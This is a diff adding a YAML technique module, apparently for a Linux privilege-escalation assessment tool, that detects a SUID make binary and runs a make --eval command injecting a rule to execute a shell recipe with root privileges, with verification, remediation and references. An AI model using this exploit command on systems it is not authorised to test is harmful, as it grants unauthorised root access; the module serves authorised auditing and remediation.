@@ -1,0 +1,27 @@
+# SUID make → root (GTFOBins)
+technique: T1548.001
+name: SUID make → root (GTFOBins)
+tactic: [privilege-escalation]
+platform: [linux]
+ranking:
+  exploitability: high
+  safety: read-only
+  detection: quiet
+detect:
+  suid: make
+execute:
+  # `--eval` injects a Makefile rule; `-s` silences the "Entering
+  # directory" chatter. The recipe `id` runs with the SUID context.
+  command: "{{binary}} -s --eval=$'x:\\n\\t-id'"
+verify:
+  success: "uid=0"
+cleanup:
+  command: ""
+report:
+  vector_type: gtfobins_suid
+  description: >
+    SUID make evaluates a rule from `--eval` and shells out for its
+    recipe. The shell inherits the SUID context (root).
+  remediation: >
+    Remove the SUID bit from make.
+  refs: [T1548.001, GTFOBins/make]
